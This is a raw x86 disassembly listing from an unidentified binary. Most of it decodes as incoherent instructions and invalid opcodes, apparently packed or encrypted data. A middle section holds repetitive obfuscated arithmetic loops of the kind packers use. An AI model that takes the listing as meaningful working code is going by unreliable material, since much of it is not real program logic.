  41f3bf:	repz mov edx,0x1c86ff62
  41f3c5:	dec    esi
  41f3c6:	shr    BYTE PTR [edx+0x69901b36],1
  41f3cc:	mov    ds:0x984fcdb1,eax
  41f3d1:	retf   0x7c27
  41f3d4:	fs repz push 0xffffffa3
  41f3d8:	cmp    ecx,DWORD PTR [esi-0x50]
  41f3db:	xchg   ebx,eax
  41f3dc:	sub    bl,BYTE PTR [ebx]
  41f3de:	(bad)  
  41f3df:	daa    
  41f3e0:	loop   0x41f401
  41f3e2:	test   DWORD PTR [ecx-0x2ad85a1],eax
  41f3e8:	sub    DWORD PTR [eax],0xffffffc1
  41f3eb:	cs loop 0x41f3d2
  41f3ee:	das    
  41f3ef:	mov    esi,0x8add3484
  41f3f4:	mov    bh,0x40
  41f3f6:	sub    DWORD PTR [edx+0x5fdc73be],edi
  41f3fc:	dec    ebp
  41f3fd:	ins    BYTE PTR es:[edi],dx
  41f3fe:	inc    esp
  41f3ff:	(bad)  
  41f400:	add    eax,0xb44b4c9d
  41f405:	mov    ebx,0x7a759e69
  41f40a:	xor    BYTE PTR [ebx+0x2b],0x7d
  41f40e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f40f:	call   DWORD PTR [eax+0x41]
  41f412:	lods   al,BYTE PTR ds:[esi]
  41f413:	push   0x22
  41f415:	jnp    0x41f41d
  41f417:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f418:	mov    eax,ds:0x905b56e4
  41f41d:	pop    eax
  41f41e:	cmp    DWORD PTR [esi+0x78],eax
  41f421:	outs   dx,BYTE PTR ds:[esi]
  41f422:	xor    edx,DWORD PTR [edi]
  41f424:	shl    al,1
  41f426:	pop    ds
  41f427:	push   ss
  41f428:	jb     0x41f3c5
  41f42a:	sub    ecx,ecx
  41f42c:	retf   0xa2b8
  41f42f:	adc    bl,bh
  41f431:	lea    edi,[esi+0x74]
  41f434:	jp     0x41f40d
  41f436:	dec    eax
  41f437:	ins    BYTE PTR es:[edi],dx
  41f438:	(bad)  
  41f439:	jne    0x41f439
  41f43b:	push   ss
  41f43c:	and    BYTE PTR [ebx+0x108e94a5],ah
  41f442:	mov    ebx,0x81fa23e2
  41f447:	jmp    FWORD PTR [esi-0x5d]
  41f44a:	mov    ebp,0x7b17f3e9
  41f44f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f450:	out    dx,eax
  41f451:	dec    ebx
  41f452:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f453:	cwde   
  41f454:	jns    0x41f43c
  41f456:	sbb    ecx,ecx
  41f458:	fistp  WORD PTR [ecx-0x60]
  41f45b:	loopne 0x41f497
  41f45d:	mov    ecx,0xc0d9ba3b
  41f462:	adc    al,0xbd
  41f464:	push   ebx
  41f465:	push   edi
  41f466:	imul   ebp,DWORD PTR [ebp-0x73],0x4f
  41f46a:	ret    0x834d
  41f46d:	addr16 pop esp
  41f46f:	rol    BYTE PTR [edi+edx*4],1
  41f472:	add    DWORD PTR [eax-0xb],ebp
  41f475:	outs   dx,BYTE PTR ds:[esi]
  41f476:	sub    al,0xf7
  41f478:	mov    ch,0xe
  41f47a:	jns    0x41f45c
  41f47c:	ins    BYTE PTR es:[edi],dx
  41f47d:	adc    al,0x66
  41f47f:	fwait
  41f480:	div    BYTE PTR [ecx]
  41f482:	cwde   
  41f483:	in     al,0x6b
  41f485:	mov    eax,ds:0x543128ca
  41f48a:	cmp    BYTE PTR [ebx],bh
  41f48c:	or     BYTE PTR [edi+0x5a358b67],bl
  41f492:	not    DWORD PTR [esi]
  41f494:	into   
  41f495:	xor    al,0x1d
  41f497:	sub    BYTE PTR [ebx],al
  41f499:	pop    ebx
  41f49a:	outs   dx,BYTE PTR ds:[esi]
  41f49b:	mov    ah,0x3c
  41f49d:	lds    eax,FWORD PTR [ecx]
  41f49f:	imul   ebx,DWORD PTR [edi-0x16],0xffffffc2
  41f4a3:	jo     0x41f4af
  41f4a5:	imul   ebp,DWORD PTR [edi],0x2b
  41f4a8:	sub    eax,0x80f152ff
  41f4ad:	cs sub al,0x82
  41f4b0:	test   DWORD PTR [eax],esp
  41f4b2:	data16 adc ch,BYTE PTR [esi+0xf0186c0]
  41f4b9:	dec    eax
  41f4ba:	out    0x3c,al
  41f4bc:	jne    0x41f518
  41f4be:	xchg   ecx,eax
  41f4bf:	push   edi
  41f4c0:	xchg   eax,ebx
  41f4c2:	mov    cl,0x66
  41f4c4:	sbb    BYTE PTR [ebx],bh
  41f4c6:	ret    0xdd5d
  41f4c9:	xlat   BYTE PTR ds:[ebx]
  41f4ca:	dec    ebp
  41f4cb:	inc    edi
  41f4cc:	adc    dh,BYTE PTR [ebx+esi*8]
  41f4cf:	add    al,0x1c
  41f4d1:	int    0xc6
  41f4d3:	sahf   
  41f4d4:	mov    dl,al
  41f4d6:	jecxz  0x41f538
  41f4d8:	mov    BYTE PTR [eax+0x4dfb4567],al
  41f4de:	cmp    eax,0xea0b7a1d
  41f4e3:	daa    
  41f4e4:	jp     0x41f4b8
  41f4e6:	int3   
  41f4e7:	sub    BYTE PTR fs:[esi-0x3e],al
  41f4eb:	outs   dx,DWORD PTR ds:[esi]
  41f4ec:	pop    edi
  41f4ed:	push   edx
  41f4ee:	out    0x3c,eax
  41f4f0:	call   0xa2f660c8
  41f4f5:	je     0x41f4da
  41f4f7:	jb     0x41f530
  41f4f9:	xchg   ebp,eax
  41f4fa:	pop    esi
  41f4fb:	je     0x41f514
  41f4fd:	into   
  41f4fe:	outs   dx,DWORD PTR ds:[esi]
  41f4ff:	fdiv   DWORD PTR [ebx]
  41f501:	add    BYTE PTR [edi+0x40],ah
  41f504:	lock cmp edx,DWORD PTR [edi-0x24]
  41f508:	mov    edi,0x68a40be7
  41f50d:	push   ecx
  41f50e:	rcr    BYTE PTR [edi],cl
  41f510:	cmp    BYTE PTR [edx],al
  41f512:	sbb    DWORD PTR [eax],esi
  41f514:	je     0x41f4b0
  41f516:	iret   
  41f517:	shl    BYTE PTR [esi-0x77],cl
  41f51a:	lods   eax,DWORD PTR ds:[esi]
  41f51b:	or     esi,DWORD PTR [ecx-0x5dde7cc2]
  41f521:	ja     0x41f55c
  41f523:	xor    edi,DWORD PTR [ebx+edi*8-0x72]
  41f527:	adc    dl,dh
  41f529:	inc    ebp
  41f52a:	jle    0x41f59a
  41f52c:	or     bl,BYTE PTR [ebx+0x35]
  41f52f:	mov    ch,0xbc
  41f531:	call   0x775326b9
  41f536:	fbstp  TBYTE PTR [eax]
  41f538:	outs   dx,DWORD PTR ds:[esi]
  41f539:	in     al,0x91
  41f53b:	fucomip st,st(4)
  41f53d:	push   0x34
  41f53f:	shl    edi,1
  41f541:	mov    ds:0x4983ed27,eax
  41f546:	lock stc 
  41f548:	fcom   QWORD PTR [eax-0x78]
  41f54b:	ins    DWORD PTR es:[edi],dx
  41f54c:	push   ecx
  41f54d:	add    DWORD PTR [ebp-0x1d],ebp
  41f550:	jg     0x41f58f
  41f552:	out    0xd,al
  41f554:	sbb    al,0x2a
  41f556:	dec    eax
  41f557:	inc    esi
  41f558:	ds or  eax,0xa5564c70
  41f55e:	iret   
  41f55f:	xor    BYTE PTR [esi-0x65],bh
  41f562:	cmp    dl,BYTE PTR [ecx-0x44da96b2]
  41f568:	xchg   esp,eax
  41f569:	sub    al,BYTE PTR [edx-0x2d]
  41f56c:	add    eax,0xb33c0e24
  41f571:	and    cl,BYTE PTR [edi+0x5adea5da]
  41f577:	add    DWORD PTR [edx-0x5427e51c],edx
  41f57d:	pop    edx
  41f57e:	cmp    DWORD PTR [edx-0x73],0x23
  41f582:	je     0x41f536
  41f584:	xor    edx,DWORD PTR [ecx]
  41f586:	test   eax,0x665d7fa9
  41f58b:	xor    al,BYTE PTR [eax+0x56]
  41f58e:	jmp    DWORD PTR [ecx+0x17]
  41f591:	pop    ebx
  41f592:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f593:	sub    eax,0x6abddb78
  41f598:	push   ebx
  41f599:	inc    ebp
  41f59a:	xor    BYTE PTR [ecx],0x91
  41f59d:	into   
  41f59e:	jle    0x41f5f9
  41f5a0:	mov    bl,0x70
  41f5a2:	mov    dh,0x64
  41f5a4:	pop    esi
  41f5a5:	retf   
  41f5a6:	sbb    esi,DWORD PTR [esi+edx*8+0x6]
  41f5aa:	loop   0x41f5ab
  41f5ac:	push   ds
  41f5ad:	outs   dx,DWORD PTR ds:[esi]
  41f5ae:	jo     0x41f60c
  41f5b0:	and    ecx,DWORD PTR [edx]
  41f5b2:	and    bh,BYTE PTR [ecx+0x1170e7f3]
  41f5b8:	adc    bh,BYTE PTR ds:0x479ca6fd
  41f5be:	jne    0x41f5ca
  41f5c0:	(bad)  
  41f5c1:	lods   eax,DWORD PTR ds:[esi]
  41f5c2:	test   al,0x94
  41f5c4:	push   ebp
  41f5c5:	mov    ch,0xa1
  41f5c7:	inc    ecx
  41f5c8:	out    0x90,eax
  41f5ca:	mov    edx,0x94eecd4e
  41f5cf:	jl     0x41f5e7
  41f5d1:	retf   0x599e
  41f5d4:	adc    ah,BYTE PTR [ebx]
  41f5d6:	add    bl,dl
  41f5d8:	jg     0x41f5b2
  41f5da:	stos   BYTE PTR es:[edi],al
  41f5db:	cmc    
  41f5dc:	(bad)  
  41f5de:	mov    ebx,ds
  41f5e0:	outs   dx,BYTE PTR ds:[esi]
  41f5e1:	fist   WORD PTR [ebp-0x41]
  41f5e4:	jbe    0x41f59c
  41f5e6:	aas    
  41f5e7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f5e8:	retf   0x71af
  41f5eb:	in     al,dx
  41f5ec:	pop    esp
  41f5ed:	mov    eax,ds:0xa5b7d930
  41f5f2:	push   esp
  41f5f3:	mov    dl,0xbf
  41f5f5:	inc    eax
  41f5f6:	std    
  41f5f7:	push   es
  41f5f8:	cmp    cl,bh
  41f5fa:	mov    al,0xeb
  41f5fc:	dec    edx
  41f5fd:	mov    ebx,0x6d03bc62
  41f602:	sbb    cl,BYTE PTR [ebp+0x39fe06c3]
  41f608:	mov    esi,0x11933f89
  41f60d:	cwde   
  41f60e:	dec    edx
  41f60f:	mov    edi,0x54533e7e
  41f614:	cmp    DWORD PTR [ebp-0x16ad8d63],0xffffffb1
  41f61b:	mov    ecx,0x9192c0da
  41f620:	or     dl,al
  41f622:	sub    eax,0x6a051b9f
  41f627:	cld    
  41f628:	pop    ecx
  41f629:	or     esi,0xffffffe2
  41f62c:	push   ss
  41f62d:	mov    ebp,0x20ef099f
  41f632:	dec    ecx
  41f633:	push   ecx
  41f634:	pop    esi
  41f635:	int3   
  41f636:	sbb    eax,0xffffffa5
  41f639:	aas    
  41f63a:	nop
  41f63b:	cmp    ebp,DWORD PTR [edx+eax*1+0x65]
  41f63f:	and    BYTE PTR [ecx],bl
  41f641:	aaa    
  41f642:	xor    al,0xd9
  41f644:	pop    ebp
  41f645:	fcom   DWORD PTR ds:0x31e3cb76
  41f64b:	xchg   BYTE PTR [esi],ch
  41f64d:	adc    al,0x79
  41f64f:	hlt    
  41f650:	rol    cl,0xb4
  41f653:	mov    ds:0x82b18eac,eax
  41f658:	and    DWORD PTR [edx],edx
  41f65a:	mov    edx,0xcaaff122
  41f65f:	cld    
  41f660:	mov    edx,DWORD PTR [edi+0x6c]
  41f663:	pop    esp
  41f664:	adc    dh,dh
  41f666:	stos   BYTE PTR es:[edi],al
  41f667:	xchg   ebx,eax
  41f668:	sub    cl,bh
  41f66a:	test   DWORD PTR [ecx],edi
  41f66c:	ret    
  41f66d:	repz arpl WORD PTR [ebx-0x761b7de4],bp
  41f674:	pop    eax
  41f675:	lock adc al,0xd5
  41f678:	jp     0x41f6dd
  41f67a:	lahf   
  41f67b:	mov    esi,0xe147762b
  41f680:	int    0xd2
  41f682:	push   ds
  41f683:	out    dx,eax
  41f684:	ss lahf 
  41f686:	inc    edx
  41f687:	push   0xbd5eaf3
  41f68c:	das    
  41f68d:	and    dl,bl
  41f68f:	shr    DWORD PTR [esi],0xc4
  41f692:	mov    ds:0x3140f330,al
  41f697:	jnp    0x41f61d
  41f699:	mov    bh,0x57
  41f69b:	clc    
  41f69c:	jae    0x41f6c9
  41f69e:	lods   al,BYTE PTR ds:[esi]
  41f69f:	stos   BYTE PTR es:[edi],al
  41f6a0:	jne    0x41f6e5
  41f6a2:	and    cl,BYTE PTR [esp+ebp*2]
  41f6a5:	loope  0x41f708
  41f6a7:	push   esp
  41f6a8:	or     eax,0x87fb3c2f
  41f6ad:	sub    al,0xe9
  41f6af:	cld    
  41f6b0:	sub    dl,BYTE PTR [edx+0x45012bf1]
  41f6b6:	jmp    0x8980:0xc82968db
  41f6bd:	mov    edi,0xf46bfb80
  41f6c2:	push   edx
  41f6c3:	inc    esp
  41f6c4:	xor    al,0xa1
  41f6c6:	ss sbb edx,ebp
  41f6c9:	xchg   edx,eax
  41f6ca:	and    ecx,ebx
  41f6cc:	(bad)  
  41f6cd:	cmp    eax,0x6e94b0d0
  41f6d2:	mov    esp,DWORD PTR [edx]
  41f6d4:	(bad)  
  41f6d5:	mov    ah,0xef
  41f6d7:	mov    ds:0x230c7e8,al
  41f6dc:	push   ds
  41f6dd:	int3   
  41f6de:	dec    ebx
  41f6df:	mov    ecx,0x5b589449
  41f6e4:	add    ecx,DWORD PTR [edx]
  41f6e6:	push   esp
  41f6e7:	jae    0x41f74a
  41f6e9:	dec    esp
  41f6ea:	leave  
  41f6eb:	inc    ecx
  41f6ec:	mov    ds:0x2bc9e522,eax
  41f6f1:	test   al,0x8f
  41f6f3:	pop    es
  41f6f4:	mov    cl,0x84
  41f6f6:	cmp    BYTE PTR [eax+0x1a57f4b7],bh
  41f6fc:	ja     0x41f6fa
  41f6fe:	cli    
  41f6ff:	sub    al,0x1d
  41f701:	push   ebp
  41f702:	sub    dl,BYTE PTR [ebx-0xf]
  41f705:	inc    edi
  41f706:	inc    ebp
  41f707:	(bad)  
  41f708:	sbb    DWORD PTR [ebx-0x5e],esi
  41f70b:	push   edx
  41f70c:	add    BYTE PTR [edi],bl
  41f70e:	jmp    0x5f1d:0xd659c196
  41f715:	fcomp  QWORD PTR [ebp+0x4c]
  41f718:	mov    cl,0xf5
  41f71a:	jge    0x41f76f
  41f71c:	sti    
  41f71d:	mov    dh,cl
  41f71f:	ja     0x41f73b
  41f721:	sub    al,0xd9
  41f723:	cmp    al,0x1
  41f725:	and    eax,0x1294b4f3
  41f72a:	fwait
  41f72b:	in     al,dx
  41f72c:	div    esp
  41f72e:	sub    BYTE PTR [ecx+ebx*8],al
  41f731:	jb     0x41f764
  41f733:	ins    BYTE PTR es:[edi],dx
  41f734:	pop    ecx
  41f735:	mov    edi,edx
  41f737:	fist   WORD PTR gs:[edx]
  41f73a:	dec    ecx
  41f73b:	sub    BYTE PTR [edi+edi*2],ch
  41f73e:	repnz aaa 
  41f740:	bound  ecx,QWORD PTR [ebx-0x1a6f96aa]
  41f746:	test   eax,0xb251042b
  41f74b:	dec    edx
  41f74c:	push   cs
  41f74d:	mov    bl,0x15
  41f74f:	mov    eax,ds:0xad4a8dfd
  41f754:	mov    ebx,0xb1f4758c
  41f759:	lea    esi,[esp+edi*2]
  41f75c:	add    DWORD PTR [edi+0x22b2f336],ebp
  41f762:	cwde   
  41f763:	shr    BYTE PTR [esi+ebx*8],0x9a
  41f767:	cmp    al,0x8c
  41f769:	cdq    
  41f76a:	add    BYTE PTR [ebx+0x13],0x47
  41f76e:	add    edi,DWORD PTR [edi-0x2e]
  41f771:	cmps   DWORD PTR gs:[esi],DWORD PTR es:[edi]
  41f773:	jg     0x41f720
  41f775:	pop    es
  41f776:	out    0x53,al
  41f778:	and    al,0x22
  41f77a:	push   esi
  41f77b:	popf   
  41f77c:	xor    eax,eax
  41f77e:	inc    esi
  41f77f:	cs jp  0x41f7be
  41f782:	cmp    eax,eax
  41f784:	push   ebx
  41f785:	and    DWORD PTR [eax-0x41fb3857],esp
  41f78b:	sub    DWORD PTR [ecx],ecx
  41f78d:	mov    ebx,0xe8b00911
  41f793:	sbb    edi,ebx
  41f795:	jl     0x41f7d8
  41f797:	add    bh,BYTE PTR [ebp+0x1a]
  41f79a:	or     DWORD PTR [edi-0x27],ebx
  41f79d:	retf   
  41f79e:	ds mov dl,0x79
  41f7a1:	pop    edi
  41f7a2:	imul   ecx,DWORD PTR [ebx],0xffffff9f
  41f7a5:	call   0xa43f:0xb5617c2e
  41f7ac:	add    eax,0x910600d4
  41f7b1:	adc    al,0x4e
  41f7b3:	fucomi st,st(4)
  41f7b5:	nop
  41f7b6:	xlat   BYTE PTR ds:[ebx]
  41f7b7:	aaa    
  41f7b8:	mov    ch,0xbf
  41f7ba:	and    ah,BYTE PTR [edi]
  41f7bc:	call   0xe6248e83
  41f7c1:	sbb    BYTE PTR [ebx+0x1],dl
  41f7c4:	retf   0xfe52
  41f7c7:	inc    ebp
  41f7c8:	xchg   DWORD PTR [edx+0x29c745b2],ebx
  41f7ce:	or     BYTE PTR [edi-0x1a07446a],ch
  41f7d4:	pop    edx
  41f7d5:	fadd   QWORD PTR [esi-0x4184926b]
  41f7db:	jmp    0xcdae:0xfb7e5a12
  41f7e2:	or     BYTE PTR [edx],bl
  41f7e4:	cmc    
  41f7e5:	ret    
  41f7e6:	add    ecx,edx
  41f7e8:	(bad)  
  41f7e9:	cld    
  41f7ea:	adc    eax,0xba2730af
  41f7ef:	aaa    
  41f7f0:	lahf   
  41f7f1:	fstp   DWORD PTR [ebx+0x7fe74cf]
  41f7f7:	retf   0x146d
  41f7fa:	mov    cl,0xbe
  41f7fc:	mov    ds:0x5365c312,al
  41f801:	adc    esp,DWORD PTR [ecx-0x1eda0eb3]
  41f807:	push   ebp
  41f808:	aaa    
  41f809:	lods   eax,DWORD PTR ds:[esi]
  41f80a:	xchg   esp,eax
  41f80b:	cmp    al,0xd5
  41f80d:	adc    al,0x92
  41f80f:	call   0x261ed6da
  41f814:	pop    esp
  41f815:	mov    al,ds:0x62a4b37a
  41f81a:	adc    esp,DWORD PTR [ebx+ebx*4+0x2fecba20]
  41f821:	stos   BYTE PTR es:[edi],al
  41f822:	cmp    al,0x76
  41f824:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f825:	js     0x41f7a9
  41f827:	cli    
  41f828:	lds    edi,FWORD PTR [eax]
  41f82a:	jmp    0x501711a8
  41f82f:	mov    ds:0xcd499738,eax
  41f834:	pushf  
  41f835:	adc    BYTE PTR [eax+0x77],bl
  41f838:	cmp    BYTE PTR [ebx],dh
  41f83a:	and    eax,0x8fdc8754
  41f83f:	fld    QWORD PTR [edi+0x68]
  41f842:	call   0xa4fd:0xe7e0de2b
  41f849:	jle    0x41f866
  41f84b:	mov    al,0x53
  41f84d:	jp     0x41f7fa
  41f84f:	pushf  
  41f850:	dec    ebx
  41f851:	sub    ecx,DWORD PTR ds:0x2279622f
  41f857:	xchg   esi,eax
  41f858:	stc    
  41f859:	and    esi,DWORD PTR [esi+0x4d]
  41f85c:	or     BYTE PTR [eax+esi*2],0x51
  41f860:	mov    edi,0x479e4a99
  41f865:	(bad)  [edi-0x6df7f174]
  41f86b:	push   esi
  41f86c:	jnp    0x41f86a
  41f86e:	add    eax,0xaa43c454
  41f873:	sub    bl,bl
  41f875:	outs   dx,BYTE PTR ds:[esi]
  41f876:	rol    DWORD PTR [ecx+eiz*2+0x1f],1
  41f87a:	dec    esp
  41f87b:	add    ebx,eax
  41f87d:	sbb    edx,edx
  41f87f:	repnz test al,0x6a
  41f882:	pop    edx
  41f883:	adc    esi,esp
  41f885:	and    BYTE PTR [ebp-0x1b32d42e],ah
  41f88b:	fstp   TBYTE PTR [edx+0x79c1cc8c]
  41f891:	jne    0x41f814
  41f893:	js     0x41f875
  41f895:	mov    edi,DWORD PTR [edx+0x5e]
  41f898:	in     al,dx
  41f899:	bound  edx,QWORD PTR [ecx-0x40]
  41f89c:	rcl    esi,0xe9
  41f89f:	jo     0x41f915
  41f8a1:	mov    edx,DWORD PTR [ebp+0x8]
  41f8a4:	mov    ebx,DWORD PTR [ebp-0x50]
  41f8a7:	add    edx,ecx
  41f8a9:	xor    edx,ebx
  41f8ab:	mov    DWORD PTR [ebp-0x50],edx
  41f8ae:	mov    edx,DWORD PTR [ebp+0x8]
  41f8b1:	mov    ebx,DWORD PTR [ebp-0x4c]
  41f8b4:	add    edx,edi
  41f8b6:	and    edx,ebx
  41f8b8:	mov    DWORD PTR [ebp-0x4c],edx
  41f8bb:	mov    edx,DWORD PTR [ebp+0x8]
  41f8be:	mov    ebx,DWORD PTR [ebp-0x48]
  41f8c1:	lea    edx,[ebx+edx*1+0x241fcdf]
  41f8c8:	mov    DWORD PTR [ebp-0x48],edx
  41f8cb:	mov    edx,DWORD PTR [ebp+0x8]
  41f8ce:	mov    ebx,0xfa5e1524
  41f8d3:	sub    ebx,edx
  41f8d5:	add    ebx,DWORD PTR [ebp-0x44]
  41f8d8:	mov    DWORD PTR [ebp-0x44],ebx
  41f8db:	mov    edx,DWORD PTR [ebp+0x8]
  41f8de:	xor    edx,eax
  41f8e0:	add    edx,esi
  41f8e2:	jne    0x41d4a1
  41f8e8:	mov    edx,DWORD PTR [ebp-0xc]
  41f8eb:	mov    dl,BYTE PTR [ebp+edx*1-0x9c]
  41f8f2:	mov    bl,BYTE PTR [ebp-0x1]
  41f8f5:	cmp    dl,bl
  41f8f7:	je     0x41f9d5
  41f8fd:	mov    ecx,DWORD PTR [ebp-0x5c]
  41f900:	mov    edx,DWORD PTR [ebp-0xc]
  41f903:	mov    dl,BYTE PTR [ebp+edx*1-0x9c]
  41f90a:	mov    ebx,DWORD PTR [ebp+0xc]
  41f90d:	xor    ecx,eax
  41f90f:	cmp    dl,BYTE PTR [ebx+ecx*1+0x3272f1]
  41f916:	jne    0x421e61
  41f91c:	mov    ecx,DWORD PTR [ebp-0x5c]
  41f91f:	mov    edx,DWORD PTR [ebp+0xc]
  41f922:	xor    ecx,eax
  41f924:	movsx  ecx,BYTE PTR [edx+ecx*1+0x3272f1]
  41f92c:	mov    edx,DWORD PTR [ebp-0x18]
  41f92f:	xor    edx,eax
  41f931:	add    edx,esi
  41f933:	cmp    ecx,edx
  41f935:	mov    ecx,DWORD PTR [ebp-0x14]
  41f938:	mov    DWORD PTR [ebp+0x8],ecx
  41f93b:	mov    ecx,DWORD PTR [ebp+0x8]
  41f93e:	je     0x422f94
  41f944:	xor    ecx,eax
  41f946:	add    ecx,esi
  41f948:	mov    ecx,0x242ebc9
  41f94d:	je     0x41fa5d
  41f953:	mov    edx,DWORD PTR [ebp+0x8]
  41f956:	mov    ebx,DWORD PTR [ebp-0x8]
  41f959:	xor    edx,eax
  41f95b:	xor    ebx,eax
  41f95d:	sub    edx,ebx
  41f95f:	sub    edx,esi
  41f961:	xor    edx,eax
  41f963:	mov    DWORD PTR [ebp+0x8],edx
  41f966:	mov    edx,DWORD PTR [ebp+0x8]
  41f969:	mov    ebx,DWORD PTR [ebp-0x58]
  41f96c:	add    edx,0x5708fa
  41f972:	imul   edx,ebx
  41f975:	mov    DWORD PTR [ebp-0x58],edx
  41f978:	mov    edx,DWORD PTR [ebp+0x8]
  41f97b:	mov    ebx,DWORD PTR [ebp-0x54]
  41f97e:	add    edx,0x64f898
  41f984:	or     edx,ebx
  41f986:	mov    DWORD PTR [ebp-0x54],edx
  41f989:	mov    edx,DWORD PTR [ebp+0x8]
  41f98c:	mov    ebx,DWORD PTR [ebp-0x50]
  41f98f:	add    edx,ecx
  41f991:	xor    edx,ebx
  41f993:	mov    DWORD PTR [ebp-0x50],edx
  41f996:	mov    edx,DWORD PTR [ebp+0x8]
  41f999:	mov    ebx,DWORD PTR [ebp-0x4c]
  41f99c:	add    edx,edi
  41f99e:	and    edx,ebx
  41f9a0:	mov    DWORD PTR [ebp-0x4c],edx
  41f9a3:	mov    edx,DWORD PTR [ebp+0x8]
  41f9a6:	mov    ebx,DWORD PTR [ebp-0x48]
  41f9a9:	lea    edx,[ebx+edx*1+0x241fcdf]
  41f9b0:	mov    DWORD PTR [ebp-0x48],edx
  41f9b3:	mov    edx,DWORD PTR [ebp+0x8]
  41f9b6:	mov    ebx,0xfa5e1524
  41f9bb:	sub    ebx,edx
  41f9bd:	add    ebx,DWORD PTR [ebp-0x44]
  41f9c0:	mov    DWORD PTR [ebp-0x44],ebx
  41f9c3:	mov    edx,DWORD PTR [ebp+0x8]
  41f9c6:	xor    edx,eax
  41f9c8:	add    edx,esi
  41f9ca:	jne    0x41f953
  41f9d0:	jmp    0x41fa5d
  41f9d5:	mov    edx,DWORD PTR [ebp-0x14]
  41f9d8:	mov    DWORD PTR [ebp+0x8],edx
  41f9db:	jmp    0x41fa50
  41f9e0:	mov    edx,DWORD PTR [ebp+0x8]
  41f9e3:	mov    ebx,DWORD PTR [ebp-0x8]
  41f9e6:	xor    edx,eax
  41f9e8:	xor    ebx,eax
  41f9ea:	sub    edx,ebx
  41f9ec:	sub    edx,esi
  41f9ee:	xor    edx,eax
  41f9f0:	mov    DWORD PTR [ebp+0x8],edx
  41f9f3:	mov    edx,DWORD PTR [ebp+0x8]
  41f9f6:	mov    ebx,DWORD PTR [ebp-0x58]
  41f9f9:	add    edx,0x5708fa
  41f9ff:	imul   edx,ebx
  41fa02:	mov    DWORD PTR [ebp-0x58],edx
  41fa05:	mov    edx,DWORD PTR [ebp+0x8]
  41fa08:	mov    ebx,DWORD PTR [ebp-0x54]
  41fa0b:	add    edx,0x64f898
  41fa11:	or     edx,ebx
  41fa13:	mov    DWORD PTR [ebp-0x54],edx
  41fa16:	mov    edx,DWORD PTR [ebp+0x8]
  41fa19:	mov    ebx,DWORD PTR [ebp-0x50]
  41fa1c:	add    edx,ecx
  41fa1e:	xor    edx,ebx
  41fa20:	mov    DWORD PTR [ebp-0x50],edx
  41fa23:	mov    edx,DWORD PTR [ebp+0x8]
  41fa26:	mov    ebx,DWORD PTR [ebp-0x4c]
  41fa29:	add    edx,edi
  41fa2b:	and    edx,ebx
  41fa2d:	mov    DWORD PTR [ebp-0x4c],edx
  41fa30:	mov    edx,DWORD PTR [ebp+0x8]
  41fa33:	mov    ebx,DWORD PTR [ebp-0x48]
  41fa36:	lea    edx,[ebx+edx*1+0x241fcdf]
  41fa3d:	mov    DWORD PTR [ebp-0x48],edx
  41fa40:	mov    edx,DWORD PTR [ebp+0x8]
  41fa43:	mov    ebx,0xfa5e1524
  41fa48:	sub    ebx,edx
  41fa4a:	add    ebx,DWORD PTR [ebp-0x44]
  41fa4d:	mov    DWORD PTR [ebp-0x44],ebx
  41fa50:	mov    edx,DWORD PTR [ebp+0x8]
  41fa53:	xor    edx,eax
  41fa55:	add    edx,esi
  41fa57:	jne    0x41f9e0
  41fa5d:	mov    edx,DWORD PTR [ebp-0x14]
  41fa60:	mov    DWORD PTR [ebp+0x8],edx
  41fa63:	jmp    0x41fad8
  41fa68:	mov    edx,DWORD PTR [ebp+0x8]
  41fa6b:	mov    ebx,DWORD PTR [ebp-0x8]
  41fa6e:	xor    edx,eax
  41fa70:	xor    ebx,eax
  41fa72:	sub    edx,ebx
  41fa74:	sub    edx,esi
  41fa76:	xor    edx,eax
  41fa78:	mov    DWORD PTR [ebp+0x8],edx
  41fa7b:	mov    edx,DWORD PTR [ebp+0x8]
  41fa7e:	mov    ebx,DWORD PTR [ebp-0x58]
  41fa81:	add    edx,0x5708fa
  41fa87:	imul   edx,ebx
  41fa8a:	mov    DWORD PTR [ebp-0x58],edx
  41fa8d:	mov    edx,DWORD PTR [ebp+0x8]
  41fa90:	mov    ebx,DWORD PTR [ebp-0x54]
  41fa93:	add    edx,0x64f898
  41fa99:	or     edx,ebx
  41fa9b:	mov    DWORD PTR [ebp-0x54],edx
  41fa9e:	mov    edx,DWORD PTR [ebp+0x8]
  41faa1:	mov    ebx,DWORD PTR [ebp-0x50]
  41faa4:	add    edx,ecx
  41faa6:	xor    edx,ebx
  41faa8:	mov    DWORD PTR [ebp-0x50],edx
  41faab:	mov    edx,DWORD PTR [ebp+0x8]
  41faae:	mov    ebx,DWORD PTR [ebp-0x4c]
  41fab1:	add    edx,edi
  41fab3:	and    edx,ebx
  41fab5:	mov    DWORD PTR [ebp-0x4c],edx
  41fab8:	mov    edx,DWORD PTR [ebp+0x8]
  41fabb:	mov    ebx,DWORD PTR [ebp-0x48]
  41fabe:	lea    edx,[ebx+edx*1+0x241fcdf]
  41fac5:	mov    DWORD PTR [ebp-0x48],edx
  41fac8:	mov    edx,DWORD PTR [ebp+0x8]
  41facb:	mov    ebx,0xfa5e1524
  41fad0:	sub    ebx,edx
  41fad2:	add    ebx,DWORD PTR [ebp-0x44]
  41fad5:	mov    DWORD PTR [ebp-0x44],ebx
  41fad8:	mov    edx,DWORD PTR [ebp+0x8]
  41fadb:	xor    edx,eax
  41fadd:	add    edx,esi
  41fadf:	jne    0x41fa68
  41fae5:	mov    edx,DWORD PTR [ebp-0x8]
  41fae8:	mov    ebx,DWORD PTR [ebp-0xc]
  41faeb:	xor    edx,eax
  41faed:	lea    edx,[edx+ebx*1+0x3272f1]
  41faf4:	jmp    0x421e4c
  41faf9:	and    BYTE PTR ds:0xc10ac90f,dh
  41faff:	mov    ds:0xfe8da196,al
  41fb04:	jmp    0x7b766b2b
  41fb09:	adc    BYTE PTR [esi+0x5e46837c],dh
  41fb0f:	add    DWORD PTR [ebx-0x1fe7c36d],0xffffffcd
  41fb16:	mov    ds:0xa60bf3e7,eax
  41fb1b:	inc    ebx
  41fb1c:	das    
  41fb1d:	jnp    0x41fb53
  41fb1f:	adc    eax,0xc9fb1d7a
  41fb24:	imul   edi,DWORD PTR [edx+0x66a47560],0x3
  41fb2b:	arpl   WORD PTR [ebx],bx
